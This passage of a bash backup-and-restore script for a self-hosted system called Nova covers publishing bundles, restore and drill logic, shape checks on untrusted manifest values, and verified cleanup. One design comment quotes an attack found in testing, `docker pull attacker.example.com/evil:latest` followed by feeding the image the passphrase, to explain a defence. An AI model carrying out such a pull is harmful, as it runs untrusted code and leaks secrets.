  # ── 21. publish ──────────────────────────────────────────────────────────
  if [ -e "$final" ]; then
    bk_fail "$final appeared while this run was packing. Nothing was overwritten."
    return 1
  fi
  if ! mv "$part" "$final"; then
    bk_fail "could not publish $part as $final."
    return 1
  fi
  BK_RUN_PART=""
  final_mode="$(bk_mode_of "$final")"
  line="$(wc -c < "$final" | tr -d ' ')"
  if [ "$final_mode" != "600" ] || [ "$line" != "$bytes" ]; then
    rm -f "$final"
    bk_fail "the published $final came back mode ${final_mode:-unreadable} and $line bytes;
       the container wrote mode 600 and $bytes bytes. It was deleted rather than
       left as a bundle nobody measured."
    return 1
  fi
  printf 'published: %s (%s bytes, mode %s)\n' "$final" "$line" "$final_mode"

  # ── 22. restart, or park ─────────────────────────────────────────────────
  if [ "$mode" = "move" ]; then
    # `|| return $?`, never `|| return 1`: every branch of bk_park runs after
    # step 21 has published, so every failure there is a 4 — the bundle IS
    # written and something after it failed. bk_park clears BK_RUN_STOPPED
    # itself, and only on success, so the trap owns the restart until the
    # park is proven.
    rc=0
    bk_park "$stamp" "$final" "$sha" "$host" "$(bk_tailnet_dns_name)" || rc=$?
    if [ "$rc" -ne 0 ]; then
      return "$rc"
    fi
  else
    # shellcheck disable=SC2086  # $writers_list is a list of service names by design
    if ! bk_docker compose "${BK_COMPOSE_ARGS[@]}" --profile '*' up -d $writers_list >/dev/null 2>&1; then
      bk_fail "the bundle IS written and verified at $final.
       Separately: \`docker compose up -d$writers_list\` did not exit 0. Nova is
       still stopped; start it by hand."
      BK_RUN_STOPPED=""
      return 4
    fi
    BK_RUN_STOPPED=""
    # shellcheck disable=SC2086  # $writers_list is a list of service names by design
    unhealthy="$(bk_wait_healthy $writers_list)" || {
      bk_fail "the bundle IS written and verified at $final, sha256 $sha.
       Separately:$unhealthy did not come back healthy within 240s. The last 20
       log lines of each:
$(for svc in $unhealthy; do
  printf '       --- %s ---\n' "$svc"
  bk_docker compose "${BK_COMPOSE_ARGS[@]}" --profile '*' logs --tail 20 "$svc" 2>&1 | sed 's/^/       /'
done)"
      return 4
    }
    printf 'restarted:%s, every one healthy\n' "$writers_list"
  fi

  # ── 23. the report ───────────────────────────────────────────────────────
  printf '\n'
  printf 'bundle      %s\n' "$final"
  printf 'bytes       %s\n' "$bytes"
  printf 'sha256      %s\n' "$sha"
  printf 'mode/owner  %s  %s:%s\n' "$final_mode" "$uid" "$gid"
  printf 'passphrase  %s (fingerprint %s, %s)\n' "$pw_source" \
    "$(printf '%s' "$pack_out" | bk_json_field passphrase_fingerprint)" \
    "$(printf '%s' "$pack_out" | bk_json_field fingerprint_kind)"
  printf 'reader      %s\n' "$(printf '%s' "$pack_out" | bk_json_field reader_sha256)"
  printf 'mode        %s, transport %s\n' "$mode" "$transport"
  printf 'not carried (each with the reason that says why):\n'
  while IFS=$'\037' read -r key name disp full svc _target why; do
    case "$disp" in
      exclude-*) ;;
      move-only) [ "$mode" = "move" ] && continue ;;
      *) continue ;;
    esac
    printf '  %-12s %-6s %s\n      %s\n' "$disp" "$key" "${full:-$name}" "$why"
  done <<EOF
$(bk_coverage_rows < "$cov")
EOF
  printf '\nrestore it with:\n  ./install restore %s\n' "$final"
  printf 'or, on a machine with no Nova:\n  tar -xOf %s restore.sh | sh -s -- %s\n' \
    "$final" "$final"

  trap - INT TERM
  trap - EXIT
  if ! bk_backup_cleanup; then
    bk_fail "the bundle IS written and verified at $final, sha256 $sha.
       Separately: the cleanup above could not finish. Each thing it could not
       do is named on its own line; none of them touches the bundle."
    return 4
  fi
  return 0
}


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║ T4 — `restore`, `restore --drill` and `drill` (design-verdict §9.2-§9.4)  ║
# ╚══════════════════════════════════════════════════════════════════════════╝
#
# The half that reads the bundle back. Everything above writes one; nothing
# above proves one can be opened on a machine that is not this one.
#
# THE ONE REFUSAL THAT SHAPES THE REST: restore goes onto an EMPTY target
# only (§9.2 step 6, §14). That is why there is no pre-restore snapshot, no
# database swap and no rollback — and the consequence, which belongs in front
# of whoever runs it: **a bad restore cannot be undone in place.** What makes
# that acceptable is that a non-empty target is refused before a byte is
# written, so "a bad restore" can only mean one that failed on a machine that
# had nothing to lose.
#
# NOTHING INSIDE THE BUNDLE SELECTS AN ACTION. A bundle is a file that can
# come from anywhere. The images this verb runs are read from THIS host
# (docker, and the checkout's own compose render) or are constants; the
# volume it creates is named by the TARGET's render; every path it reads is
# derived from a value it has already shape-checked. That class — an
# unauthenticated value steering an action — has bitten this file three times
# (s41/rulings.md, last section), and each of the three looked harmless.

# ── reading MANIFEST.json, whose indentation is its grammar ─────────────────
#
# novabundle.dump_manifest writes `json.dumps(indent=2)`, so a top-level key
# sits at two spaces, a nested object's keys at four, and a list item opens
# with `{` at four and carries its own keys at six. Matching the exact column
# is what keeps a nested object (`databases[].selftest`) from being read as a
# new row — the mistake bk_coverage_rows was written to avoid, which dropped
# most of a 22-entry list on its first run.

# One TOP-LEVEL scalar. Non-zero when the manifest has no such key, never an
# empty string that reads as a value.
bk_m_top() {
  awk -v k="$1" '
    index($0, "  \"" k "\": ") == 1 {
      s = substr($0, length(k) + 7)
      sub(/,$/, "", s)
      if (s != "null") {
        if (substr(s, 1, 1) == "\"") { s = substr(s, 2); sub(/"$/, "", s) }
        gsub(/\\"/, "\"", s); gsub(/\\\\/, "\\", s)
      } else { s = "" }
      print s
      found = 1
      exit
    }
    END { exit (found ? 0 : 1) }
  '
}

# One key of one top-level OBJECT, at exactly four spaces.
bk_m_sub() {
  awk -v o="$1" -v k="$2" '
    index($0, "  \"" o "\": {") == 1 { inobj = 1; next }
    inobj && index($0, "  }") == 1 { inobj = 0; next }
    !inobj { next }
    index($0, "    \"" k "\": ") == 1 {
      s = substr($0, length(k) + 9)
      sub(/,$/, "", s)
      if (s != "null") {
        if (substr(s, 1, 1) == "\"") { s = substr(s, 2); sub(/"$/, "", s) }
        gsub(/\\"/, "\"", s); gsub(/\\\\/, "\\", s)
      } else { s = "" }
      print s
      found = 1
      exit
    }
    END { exit (found ? 0 : 1) }
  '
}

# Every key NAME of one top-level object, one per line. Used to compare
# manifest.session against BK_SESSION_SQL's own six: a digest measured under
# a frame this restore does not know is not comparable to one it re-measures
# (measurement-frames-outlive-their-code).
bk_m_sub_keys() {
  awk -v o="$1" '
    index($0, "  \"" o "\": {") == 1 { inobj = 1; next }
    inobj && index($0, "  }") == 1 { inobj = 0; next }
    !inobj { next }
    index($0, "    \"") == 1 {
      s = substr($0, 6)
      sub(/".*$/, "", s)
      print s
    }
  '
}

# Rows of one top-level LIST of objects, as US-separated fields in the order
# $2 names them (comma-separated). US (0x1f) and not tab for the reason
# bk_coverage_rows records: tab is IFS whitespace, so `read` collapses a run
# of it and every field after an empty one shifts left.
bk_m_rows() {
  awk -v list="$1" -v keys="$2" '
    function flush(   i, out) {
      out = ""
      for (i = 1; i <= nk; i++) out = out (i > 1 ? SEP : "") v[key[i]]
      print out
    }
    BEGIN { SEP = sprintf("%c", 31); nk = split(keys, key, ",") }
    index($0, "  \"" list "\": []") == 1 { exit }
    index($0, "  \"" list "\": [") == 1 { inlist = 1; next }
    !inlist { next }
    index($0, "  ]") == 1 { inlist = 0; next }
    index($0, "    {") == 1 {
      for (i = 1; i <= nk; i++) v[key[i]] = ""
      inrow = 1
      next
    }
    !inrow { next }
    index($0, "    }") == 1 { flush(); inrow = 0; next }
    index($0, "      \"") == 1 {
      name = substr($0, 8)
      sub(/".*$/, "", name)
      s = $0
      sub(/^      "[^"]*": /, "", s)
      sub(/,$/, "", s)
      if (s == "null") { s = "" }
      else if (substr(s, 1, 1) == "\"") { s = substr(s, 2); sub(/"$/, "", s) }
      gsub(/\\"/, "\"", s); gsub(/\\\\/, "\\", s)
      for (i = 1; i <= nk; i++) if (key[i] == name) v[name] = s
    }
  '
}

# A top-level LIST OF STRINGS (env_keys, coverage.sources), one per line.
bk_m_strings() {
  awk -v list="$1" '
    index($0, "  \"" list "\": []") == 1 { exit }
    index($0, "  \"" list "\": [") == 1 { inlist = 1; next }
    !inlist { next }
    index($0, "  ]") == 1 { exit }
    {
      s = $0
      sub(/^    "/, "", s); sub(/",?$/, "", s)
      if (s != "") print s
    }
  '
}

# ── the shapes a hostile manifest is checked against ────────────────────────
#
# Every one of these runs BEFORE the value reaches a command. nova_restore.py
# already refuses an escaping member path and an illegal restore_to; these
# are the second brace, on the values THIS shell then builds paths, SQL and
# argv out of.

bk_is_sql_name() {
  case "$1" in
    "" | [!A-Za-z_]*) return 1 ;;
    *[!A-Za-z0-9_]*) return 1 ;;
  esac
  [ "${#1}" -le 63 ] || return 1
  return 0
}

bk_is_volume_key() {
  case "$1" in
    "" | [!A-Za-z0-9]*) return 1 ;;
    *[!A-Za-z0-9_.-]*) return 1 ;;
  esac
  return 0
}

# ── the images, all of them resolved on THIS host ───────────────────────────
#
# §9.2 step 9 and §9.3 step 2. The backup side reads the postgres image ID off
# the running server, which is exactly what a restore target does not have, so
# this resolves the TAG out of the checkout's own compose render and pulls it
# if it is absent (python-tool minor 6).
#
# WHERE THIS DIFFERS FROM §9.3 step 2, deliberately: the verdict has the drill
# take $PG_IMAGE "by tag from the manifest" and the decryptor from
# `meta.fallback_image`. Both are values inside the file being opened, and the
# 2026-09-21 amendment in s41/rulings.md settled that class for restore.sh
# after a recording docker stub showed a hostile bundle making the restore
# `docker pull attacker.example.com/evil:latest` and then handing it the
# passphrase on stdin. The same argument applies here unchanged — an image
# that has been pulled, run and fed the passphrase has survived the decrypt
# completely — so both images are read from this host instead. port-v3 m9's
# actual requirement (the gate checks the version it will use) is kept: ONE
# value, used for the version gate and for the server.
bk_render_pg_tag() {
  local facts="$1" tag
  tag="$(bk_cfg_service_image postgres < "$facts/config.yaml")"
  if [ -z "$tag" ]; then
    bk_fail "this checkout's compose render names no image for the \`postgres\` service,
       so nothing here knows which postgres to restore through. A restore never
       takes that name out of the bundle."
    return 1
  fi
  printf '%s\n' "$tag"
}

# Present locally, or pulled and then proven present. A pull that "succeeded"
# and left nothing behind is the fallback-that-reads-as-success this repo
# hates; the inspect afterwards is what refuses it.
bk_ensure_image() {
  local tag="$1"
  if bk_docker image inspect "$tag" >/dev/null 2>&1; then
    printf 'image: %s is already on this host\n' "$tag" >&2
    return 0
  fi
  printf 'image: pulling %s\n' "$tag" >&2
  if ! bk_docker pull "$tag" >/dev/null 2>&1; then
    bk_fail "\`docker pull $tag\` did not exit 0, so the image this restore needs is not
       here and could not be fetched."
    return 1
  fi
  if ! bk_docker image inspect "$tag" >/dev/null 2>&1; then
    bk_fail "\`docker pull $tag\` exited 0 and \`docker image inspect $tag\` still reports
       nothing. A pull that reads as success and left no image behind is worse
       than a failed pull."
    return 1
  fi
  return 0
}

# The image that decrypts. CONSTANTS and a reading off THIS host, never a
# field of the bundle (s41/rulings.md, 2026-09-21). In order:
#   1. NOVA_CRYPTO_IMAGE, if the operator typed one;
#   2. this project's own core image, read off its container the way
#      pack_image does — a drill on a machine that has run ./install;
#   3. BK_FALLBACK_IMAGE, the constant, pulled — which is what makes a drill
#      need docker and not a completed install (shell-first C3: this compose
#      file carries no `image:` for core, so `nova-core` does not exist until
#      ./install has built it).
BK_FALLBACK_IMAGE="python:3.12-slim"

bk_crypto_image() {
  local id
  if [ -n "${NOVA_CRYPTO_IMAGE:-}" ]; then
    bk_ensure_image "$NOVA_CRYPTO_IMAGE" || return 1
    printf '%s\n' "$NOVA_CRYPTO_IMAGE"
    return 0
  fi
  if id="$(pack_image 2>/dev/null)" && [ -n "$id" ]; then
    printf '%s\n' "$id"
    return 0
  fi
  bk_ensure_image "${NOVA_FALLBACK_IMAGE:-$BK_FALLBACK_IMAGE}" || return 1
  printf '%s\n' "${NOVA_FALLBACK_IMAGE:-$BK_FALLBACK_IMAGE}"
}

# ── the markers ─────────────────────────────────────────────────────────────

bk_restore_marker() {
  printf '%s\n' "${BK_RESTORE_MARKER:-$BK_DIR/.restore-in-progress}"
}
bk_restored_marker() {
  printf '%s\n' "${BK_RESTORED_MARKER:-$BK_DIR/.restored}"
}

# Write $2.. as $1's body, 0600, and READ IT BACK. A path that accepts a
# write and stores nothing is the class this catches (measured on --move: a
# symlink to /dev/null accepts every write and keeps none).
bk_write_marker() {
  local path="$1" body="$2"
  mkdir -p "$(dirname "$path")" 2>/dev/null
  (
    umask 077
    printf '%s\n' "$body" > "$path"
  ) || {
    bk_fail "could not write $path."
    return 1
  }
  chmod 600 "$path" 2>/dev/null
  if [ "$(cat "$path" 2>/dev/null)" != "$body" ]; then
    bk_fail "$path did not read back as it was written, so nothing here can say what
       this run created."
    return 1
  fi
  if [ "$(bk_mode_of "$path")" != "600" ]; then
    bk_fail "$path came back mode $(bk_mode_of "$path"), not 600."
    return 1
  fi
  return 0
}

# ── the drill namespace, asserted on the string that reaches the command ────
#
#   DRILL_RE = ^nova-drill-[0-9a-f]{8}(-pg|-net|_[A-Za-z0-9][A-Za-z0-9_.-]*)$
#
# python-tool M7: the shape the design first wrote (`^nova-drill-[0-9a-f]{8}$`)
# matches NONE of the names it was said to guard, so the control was either
# failing on every create or being applied to a different string from the one
# `docker volume rm` receives — which is its entire purpose. This is asserted
# immediately before every create and immediately before every delete.
bk_drill_assert_name() {
  local name="$1" what="$2" rest id suffix tail
  rest="${name#nova-drill-}"
  if [ "nova-drill-$rest" != "$name" ]; then
    bk_drill_refuse "$name" "$what"
    return 1
  fi
  id="$(printf '%s' "$rest" | cut -c1-8)"
  suffix="$(printf '%s' "$rest" | cut -c9-)"
  if [ "${#id}" -ne 8 ]; then
    bk_drill_refuse "$name" "$what"
    return 1
  fi
  case "$id" in
    *[!0-9a-f]*)
      bk_drill_refuse "$name" "$what"
      return 1
      ;;
  esac
  case "$suffix" in
    -pg | -net) return 0 ;;
    _[A-Za-z0-9])
      return 0
      ;;
    _[A-Za-z0-9]*)
      tail="${suffix#_?}"
      case "$tail" in
        *[!A-Za-z0-9_.-]*)
          bk_drill_refuse "$name" "$what"
          return 1
          ;;
      esac
      return 0
      ;;
  esac
  bk_drill_refuse "$name" "$what"
  return 1
}

bk_drill_refuse() {
  bk_fail "refusing to $2 the docker object '$1': a drill object is named
       ^nova-drill-[0-9a-f]{8}(-pg|-net|_[A-Za-z0-9][A-Za-z0-9_.-]*)\$ and nothing
       else. This is asserted on the name that reaches the command, before every
       create and before every delete."
}

# ^nova_verify_[0-9a-f]{8}$, the drill's scratch databases. Its own prefix and
# NOT nova_selftest_ (shell-first m11): a backup's self-test database must
# never be a thing a concurrent drill's sweep can drop.
bk_assert_verify_name() {
  local name="$1" what="$2" tail
  tail="${name#nova_verify_}"
  if [ "nova_verify_$tail" != "$name" ] || [ "${#tail}" -ne 8 ]; then
    bk_fail "refusing to $what a database called '$name': a drill database is named
       ^nova_verify_[0-9a-f]{8}\$ and nothing else."
    return 1
  fi
  case "$tail" in
    *[!0-9a-f]*)
      bk_fail "refusing to $what a database called '$name': a drill database is named
       ^nova_verify_[0-9a-f]{8}\$ and nothing else."
      return 1
      ;;
  esac
  return 0
}

bk_hex8() {
  local hex
  hex="$(od -An -N4 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n')"
  if [ "${#hex}" -ne 8 ]; then
    bk_fail "could not read 4 random bytes for a drill run id."
    return 1
  fi
  printf '%s\n' "$hex"
}

# Every create and every delete of a drill object goes through one of these,
# so the assertion cannot be bypassed by a new call site.
bk_drill_volume_create() {
  bk_drill_assert_name "$1" "create" || return 1
  bk_docker volume create "$1" >/dev/null || return 1
  BK_RES_DRILL_VOLS="$BK_RES_DRILL_VOLS
$1"
  return 0
}

bk_drill_net_create() {
  bk_drill_assert_name "$1" "create" || return 1
  if ! bk_docker network create --subnet "$2" "$1" >/dev/null 2>&1; then
    bk_fail "could not create the drill network $1 with subnet $2."
    return 1
  fi
  BK_RES_DRILL_NET="$1"
  return 0
}

# ── the EXIT trap (§9.2 step 15, §9.3 step 5) ───────────────────────────────
#
# Two jobs, and they are not the same job.
#
# For a DRILL this is the teardown, and §9.3 step 5 makes it load-bearing:
# every object the run created is removed and EVERY REMOVAL IS VERIFIED —
# `docker inspect` must now fail with "no such". A removal that cannot be
# verified makes the drill FAIL, naming the leftover, rather than reporting
# success on top of a mess. Never a silent `rm -f`, never ignore_errors
# (backend/app/backup_service.py:568-602 is the shape that taught this: a
# `finally` does not survive a process restart, which is why `drill` also has
# a sweep).
#
# For a RESTORE it removes only what is throwaway — the decrypted-content
# volume and the host scratch dir. It deliberately DOES NOT remove
# deploy/.restore-in-progress: that marker exists precisely to survive a
# failure, so the re-run can quote it and offer to discard exactly the objects
# this tool created (shell-first M4).
BK_RES_CLEANED=0
BK_RES_STAGE=""
BK_RES_VOL=""
BK_RES_DRILL_VOLS=""
BK_RES_DRILL_NET=""
BK_RES_DRILL_CT=""
BK_RES_DRILL_DBS=""
BK_RES_DRILL_PGID=""

bk_restore_cleanup() {
  local failures=0 name left
  # Never -e, for bk_backup_cleanup's reason: under a live `-e` the first
  # removal this could not do would abort it half way, and a teardown that
  # stops at its first problem is exactly the mess it exists to prevent.
  set +e
  [ "$BK_RES_CLEANED" -eq 1 ] && return 0
  BK_RES_CLEANED=1

  # The scratch databases first: they live inside the drill container, which
  # is removed below.
  while IFS= read -r name; do
    [ -n "$name" ] || continue
    if ! bk_assert_verify_name "$name" "drop" || [ -z "$BK_RES_DRILL_PGID" ]; then
      failures=$((failures + 1))
      continue
    fi
    if ! bk_psql "$BK_RES_DRILL_PGID" postgres "DROP DATABASE IF EXISTS $(bk_sql_ident "$name")" >/dev/null 2>&1; then
      bk_fail "the drill could not drop its scratch database $name."
      failures=$((failures + 1))
    fi
  done <<EOF
$BK_RES_DRILL_DBS
EOF
  BK_RES_DRILL_DBS=""

  if [ -n "$BK_RES_DRILL_CT" ]; then
    if bk_drill_assert_name "$BK_RES_DRILL_CT" "remove"; then
      bk_docker rm -f "$BK_RES_DRILL_CT" >/dev/null 2>&1
      if bk_docker inspect "$BK_RES_DRILL_CT" >/dev/null 2>&1; then
        bk_fail "the drill container $BK_RES_DRILL_CT is still there after \`docker rm -f\`.
       A removal this could not verify is a FAILED drill, not a drill with a
       leftover."
        failures=$((failures + 1))
      else
        printf 'drill: removed the container %s\n' "$BK_RES_DRILL_CT"
      fi
    else
      failures=$((failures + 1))
    fi
    BK_RES_DRILL_CT=""
  fi

  left=""
  while IFS= read -r name; do
    [ -n "$name" ] || continue
    if ! bk_drill_assert_name "$name" "remove"; then
      failures=$((failures + 1))
      continue
    fi
    bk_docker volume rm -f "$name" >/dev/null 2>&1
    if bk_docker volume inspect "$name" >/dev/null 2>&1; then
      bk_fail "the drill volume $name is still there after \`docker volume rm -f\`."
      failures=$((failures + 1))
    else
      left="$left $name"
    fi
  done <<EOF
$BK_RES_DRILL_VOLS
EOF
  [ -n "$left" ] && printf 'drill: removed the volumes%s\n' "$left"
  BK_RES_DRILL_VOLS=""

  if [ -n "$BK_RES_DRILL_NET" ]; then
    if bk_drill_assert_name "$BK_RES_DRILL_NET" "remove"; then
      bk_docker network rm "$BK_RES_DRILL_NET" >/dev/null 2>&1
      if bk_docker network inspect "$BK_RES_DRILL_NET" >/dev/null 2>&1; then
        bk_fail "the drill network $BK_RES_DRILL_NET is still there after \`docker network rm\`."
        failures=$((failures + 1))
      else
        printf 'drill: removed the network %s\n' "$BK_RES_DRILL_NET"
      fi
    else
      failures=$((failures + 1))
    fi
    BK_RES_DRILL_NET=""
  fi

  if [ -n "$BK_RES_VOL" ]; then
    bk_docker volume rm -f "$BK_RES_VOL" >/dev/null 2>&1
    if bk_docker volume inspect "$BK_RES_VOL" >/dev/null 2>&1; then
      bk_fail "the decrypted-content volume $BK_RES_VOL is still there. It holds the
       plaintext database dumps and the carried .env values: remove it by hand
       with \`docker volume rm -f $BK_RES_VOL\`."
      failures=$((failures + 1))
    else
      printf 'cleanup: removed the decrypted-content volume %s\n' "$BK_RES_VOL"
    fi
    BK_RES_VOL=""
  fi

  if [ -n "$BK_RES_STAGE" ] && [ -d "$BK_RES_STAGE" ]; then
    rm -rf "$BK_RES_STAGE"
    if [ -d "$BK_RES_STAGE" ]; then
      bk_fail "could not remove $BK_RES_STAGE, which holds the carried .env values."
      failures=$((failures + 1))
    fi
  fi
  BK_RES_STAGE=""

  return "$failures"
}

# ── reading out of the decrypted-content volume ─────────────────────────────
#
# The same split cmd_backup uses, for the same reason: the plaintext dumps
# hold the signing key and every provider API key, and carried.env holds every
# generated secret. They live in a throwaway docker volume the HOST NEVER
# MOUNTS, and a container writes them.
#
# Three things are copied out to the host scratch dir (0700), and the list is
# deliberately short: MANIFEST.json (whose fields are counts, digests and key
# NAMES — test_manifest.py pins that no value in it equals any value in the
# .env), the per-database counts TSV (counts and digests), and the migrations
# TSV (filenames and file hashes). env/carried.env is copied too, because its
# destination IS a host file — deploy/.env — and there is nowhere else for it
# to go; nothing ever prints one of its values. The DUMPS and the VOLUME TREES
# never leave the volume: they are restored container-to-container, and the
# listings are re-derived and diffed inside the container that wrote them
# (§9.2 step 9).
bk_stage_get() {
  local vol="$1" image="$2" rel="$3"
  bk_docker run --rm --network none --user 0:0 -v "$vol:/stage:ro" \
    --entrypoint sh "$image" -ec 'cat "/stage/$1"' sh "$rel"
}

bk_stage_has() {
  local vol="$1" image="$2" rel="$3"
  bk_docker run --rm --network none --user 0:0 -v "$vol:/stage:ro" \
    --entrypoint sh "$image" -ec '[ -e "/stage/$1" ]' sh "$rel" >/dev/null 2>&1
}

# ── the manifest, which the placement does NOT leave behind ────────────────
#
# §9.2 steps 4 and 5 in one container run: prove the decryptor and the
# passphrase against 64 known bytes with their own fresh salt BEFORE a
# payload byte is read, then hand back the MANIFEST.json sealed inside.
#
# WHY THIS EXISTS AT ALL, because it looks like a duplicate of
# `nova_restore.py --out` and is not. That verb places every member and then
# does
#
#     carried = os.path.join(root, INNER_MANIFEST)
#     if os.path.isfile(carried): os.rename(carried, out/MANIFEST.json)
#
# and `carried` is never a file: `_open_payload` reads MANIFEST.json with
# `tar.next()` and only then re-scans, and a tarfile re-scan resumes from the
# CURRENT offset — so the first member is not among the ones `safe_extract`
# writes. Measured, not inferred. The guard silently never fires, so a
# standalone restore on a bare machine hands the operator every member and
# not the manifest that says what they are. That is `nova_restore.py`'s to
# fix and this task may not edit it (see the report); until it is, the
# manifest is read here.
#
# Everything below is nova_restore.py's OWN reviewed functions, called in its
# own order; no crypto and no path handling is re-implemented. It decrypts the
# payload once and reads ONE member — it does not extract the archive — so
# the cost over `--out` is a second decrypt and not a second extraction.
# `cryptography` is not imported anywhere in this path, which is what lets it
# run in the fallback image a bare target actually has.
bk_read_manifest() {
  local dir="$1" base="$2" image="$3"
  bk_nova -v "$dir:/bundle:ro" "$image" python3 -c '
import json, os, shutil, sys, tarfile, tempfile

sys.path.insert(0, sys.argv[1])
import nova_restore as nr

pw = sys.stdin.readline()
if pw.endswith("\n"):
    pw = pw[:-1]
decrypt, backend = nr.gcm_backend()
sys.stderr.write("decryptor backend: %s\n" % backend)
blobs = nr.open_outer(sys.argv[2])
mine = chosen = None
for cand in (pw.strip(), pw):
    if not cand:
        continue
    mine = nr.kat_fingerprint(blobs, cand)
    try:
        nr.kat_gate(blobs, cand, decrypt)
    except nr.CryptoError:
        continue
    chosen = cand
    break
if chosen is None:
    sys.stderr.write("ERROR: %s\n" % nr._refusal_with_fingerprint(blobs, mine))
    raise SystemExit(1)
sys.stderr.write("known-answer test passed: this passphrase opens this bundle (%s)\n" % mine)
work = tempfile.mkdtemp(prefix="nova-manifest-")
os.chmod(work, 0o700)
try:
  try:
      with nr.open_outer_tar(sys.argv[2]) as tar:
          nr.safe_extract(tar, work, members=[tar.getmember(nr.OUTER_PAYLOAD)])
      inner = os.path.join(work, "inner.tgz")
      with open(os.path.join(work, nr.OUTER_PAYLOAD), "rb") as fin:
          with open(inner, "wb") as fout:
              nr.decrypt_stream(fin, fout, chosen, decrypt)
      with tarfile.open(inner, "r:gz") as tar:
          first = tar.next()
          if first is None or first.name != nr.INNER_MANIFEST:
              sys.stderr.write(
                  "ERROR: the inner archive starts with %r and a Nova bundle forces %s\n"
                  % (None if first is None else first.name, nr.INNER_MANIFEST)
              )
              raise SystemExit(2)
          handle = tar.extractfile(first)
          if handle is None:
              sys.stderr.write("ERROR: %s is not a regular file\n" % nr.INNER_MANIFEST)
              raise SystemExit(2)
          body = handle.read().decode("utf-8")
      json.loads(body)
      sys.stdout.write(body)
  except (nr.CryptoError, nr.RestoreError, ValueError, OSError) as exc:
    # A stated refusal, never a traceback: the person reading this is
    # restoring at 3am and needs a sentence. Exit 2, not 1, so the caller can
    # tell "this passphrase does not open it" from "it opened and what came
    # out is not a bundle".
    sys.stderr.write("ERROR: %s: %s\n" % (type(exc).__name__, exc))
    raise SystemExit(2)
finally:
    shutil.rmtree(work)
' /novabundle "/bundle/$base"
}

# ── §9.2 step 6: is this target empty? ──────────────────────────────────────
#
# Three findings converge on this one probe.
#
# `docker volume inspect` FIRST, because `docker run -v <name>:/probe` CREATES
# a missing volume, so the probe alone can never tell "absent" from "empty".
#
# The EXIT STATUS is read, never the emptiness of stdout (python-tool M1,
# measured: `ls -A /nonexistent | head -1` exits 0 with empty stdout, so every
# failure mode read as "empty, proceed"). A non-zero exit here is "could not
# determine", which is a REFUSAL and not a pass.
#
# /probe, because it is a path no image populates — so the probe cannot
# populate the volume it is checking (shell-first m3).
#
#   0  the volume does not exist, or exists and is empty
#   1  the volume exists and is not empty
#   2  could not determine
bk_volume_state() {
  local full="$1" image="$2" out rc=0
  bk_docker volume inspect "$full" >/dev/null 2>&1 || return 0
  out="$(bk_docker run --rm --network none -v "$full:/probe:ro" --entrypoint find \
    "$image" /probe -mindepth 1 -maxdepth 1 -print -quit 2>/dev/null)" || rc=$?
  [ "$rc" -eq 0 ] || return 2
  [ -z "$out" ] || return 1
  return 0
}

# ── §9.2 step 9: fill one volume, then diff its listing IN THE CONTAINER ────
#
# The listing is re-derived by the same four passes that wrote it
# (bk_tar_volume), inside a container, and compared line for line. Re-deriving
# a tar member's sha256 proves the bytes are intact; it does not prove the
# archive extracts, that the per-entry listing matches, or that the entry
# count is what the manifest claims — which is port-v3 M5, and the reason the
# drill runs this step too.
#
# Prints "<entries> <files> <links> <added> <removed> <changed>" and the first
# ten differing paths on stderr.
bk_fill_volume() {
  local vol="$1" image="$2" src_vol="$3" key="$4" tree="$5" line
  local entries files links added removed changed
  line="$(bk_docker run --rm --network none --user 0:0 \
    -v "$src_vol:/stage:ro" -v "$vol:/dst" --entrypoint sh "$image" -ec '
      key=$1
      tree=$2
      src="/stage/open/volumes/$tree"
      want="/stage/open/listings/$key.sha256"
      [ -d "$src" ]
      [ -f "$want" ]
      umask 077
      cp -a "$src/." /dst/
      cd /dst
      # APPLY what the sealed listing records, before measuring against it.
      #
      # The extraction cannot carry it: nova_restore.py extracts with python
      # tarfile`s `data` filter, which DISCARDS uid/gid and normalises the
      # mode. Measured on python 3.13 with a tree built for this: a 0755
      # directory lands 0700, a 0444 file lands 0644, and every entry lands
      # owned by whoever ran the extraction. So a restore that only copies
      # what landed produces a volume whose permissions and ownership are not
      # the ones that were backed up — v4_memdata is uid 1000 and
      # v4_tailscale is root, and neither would survive.
      #
      # The listing is authenticated (its sha256 is in the manifest, inside
      # the ciphertext), so this is restoring recorded DATA, not letting the
      # bundle choose an action — and every field is shape-checked before it
      # reaches a command: a path that is not `./…`, a path with a `..`
      # segment, a mode that is not 3 or 4 octal digits (which is what keeps
      # setuid, setgid and sticky out of a volume Nova mounts) or a
      # non-numeric owner stops the whole restore.
      #
      # chmod and chown are allowed to FAIL here and are not checked here:
      # the listing diff below is what judges them, and it compares the four
      # columns entry by entry. An unapplied mode is a `changed` line, not a
      # silent pass.
      grep "^[dfl] " "$want" > /tmp/want.meta || :
      while read -r kind mode uid gid p; do
        [ -n "$kind" ] || continue
        case "$p" in
          ./*) ;;
          *) printf "listing entry %s is not a ./ path\n" "$p" >&2; exit 9 ;;
        esac
        case "$p" in
          */../* | */..) printf "listing entry %s carries ..\n" "$p" >&2; exit 9 ;;
        esac
        case "$mode" in
          0 | [0-7][0-7][0-7] | 0[0-7][0-7][0-7]) ;;
          *) printf "listing entry %s has mode %s\n" "$p" "$mode" >&2; exit 9 ;;
        esac
        case "$uid$gid" in
          "" | *[!0-9]*) printf "listing entry %s is owned by %s:%s\n" "$p" "$uid" "$gid" >&2; exit 9 ;;
        esac
        if [ ! -e "$p" ] && [ ! -L "$p" ]; then
          printf "the listing names %s and it did not land\n" "$p" >&2
          exit 9
        fi
        [ "$kind" = "l" ] || chmod "$mode" "$p" 2>/dev/null || :
        chown -h "$uid:$gid" "$p" 2>/dev/null || :
      done < /tmp/want.meta
      find . -mindepth 1 \( -type f -o -type l -o -type d \) -printf "%y %#m %U %G %p\n" \
        > /tmp/meta
      find . -type l -printf "L %p -> %l\n" >> /tmp/meta
      LC_ALL=C sort -o /tmp/meta /tmp/meta
      find . -type f -print0 | LC_ALL=C sort -z > /tmp/f
      if [ -s /tmp/f ]; then xargs -0 -a /tmp/f sha256sum > /tmp/h; else : > /tmp/h; fi
      cat /tmp/meta /tmp/h > /tmp/got
      LC_ALL=C sort "$want" > /tmp/want.s
      LC_ALL=C sort /tmp/got > /tmp/got.s
      comm -13 /tmp/want.s /tmp/got.s > /tmp/plus
      comm -23 /tmp/want.s /tmp/got.s > /tmp/minus
      # The PATH out of each line kind, so a difference names an ENTRY rather
      # than a line: "L <path> -> <target>", "<d|f|l> <mode> <uid> <gid>
      # <path>", "<sha256>  <path>". A path in BOTH directions changed; one in
      # only one was added or removed. sed and not awk here because this whole
      # script is one single-quoted string in the caller and no apostrophe can
      # appear in it.
      paths() {
